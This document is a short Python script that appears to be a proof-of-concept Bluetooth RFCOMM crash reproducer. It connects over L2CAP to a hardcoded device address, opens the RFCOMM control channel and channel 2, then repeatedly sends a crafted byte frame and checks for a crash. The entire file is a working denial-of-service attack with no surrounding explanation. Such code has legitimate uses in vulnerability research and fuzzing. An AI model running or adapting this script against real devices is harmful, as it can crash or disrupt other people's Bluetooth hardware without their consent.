import bluetooth
from modules import *

def closed(target_addr):
    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    sock.connect((target_addr, RFCOMM_PSM))
    return sock

def opened_ctrl_ch(target_addr):
    sock = closed(target_addr)
    sock.send(SABM.gen(channel=CTRL_CHANNEL, transition=True))
    conn_rsp, sock = inter_recv(sock)
    if conn_rsp == None:
        print('[*] recv failed.')
        return False
    else:  
        frame_pkt = FRAME_PKT(conn_rsp)
        res = frame_pkt.parse_pkt()
        if res:
            if res != "UA":
                print(f"[*] cannot open channel0")
                return False
    return sock

def closed_normal_ch(target_addr, channel):
    # enable ctrl channel
    sock = opened_ctrl_ch(target_addr)
    sock.send(UIH.gen(channel=CTRL_CHANNEL, channel_to_ctrl=channel, transition=True, mx_type=PN))
    try:
        while True:
            conn_rsp, sock = inter_recv(sock)
            frame_pkt = FRAME_PKT(conn_rsp)
            res = frame_pkt.parse_pkt()
            if res:
                if res == "UIH":
                    break
                else:
                    print(f"[*] cannot open channel{channel}")
                    return False
    except:
        print(f"[*] cannot open channel{channel}")
        return False

    return sock 

try:
    while True:
        sock = closed_normal_ch("6c:d3:ee:1c:25:67", 2)
        sock.send(b"\x03\xef\x05\xa1\x01\x70")
        sock.close()
except:
    print("[-]crash?")

